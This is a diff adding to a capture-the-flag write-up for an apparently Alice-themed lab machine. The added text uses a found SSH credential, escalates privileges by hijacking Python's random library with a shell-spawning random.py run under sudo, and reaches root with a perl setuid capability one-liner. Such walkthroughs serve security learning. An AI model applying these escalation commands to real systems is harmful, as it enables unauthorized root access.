@@ -44,3 +44,26 @@ We got this page:<br>
 ![rabbit page](img/4.png)<br>
 And this interesting little string: `alice:HowDothTheLittleCrocodileImproveHisShiningTail`
 Those were credentials that let us into ssh. 
+
+There is a python script that shows us random lines from the poem. It uses the "random" library. We can exploit it.
+We can use next commands to see where the library is located:
+`python3 -c 'import sys; print (sys.path)`
+`locate random.py`
+
+If any of these search paths are world writable, it will impose a risk of privilege escalation, as placing a file in one of these directories with a name that matches the requested library will load that file, assuming it’s the first occurrence. The order at which it loads those path is beginning with our current directory where the python script was executed from.
+
+so the next step we do is:
+we create file `random.py` in the same directory and add there the next code:
+```
+import os
+
+os.system("/bin/bash")
+```
+and then:
+`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
+
+Then we can get access to the user hatter. ssh in it. After we are there we can download linpeas.sh and it will show us that we have the perl capability.
+
+We go here: https://gtfobins.github.io/gtfobins/perl/#capabilities. Copy this line:
+`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
+And now are root. Find the flags.
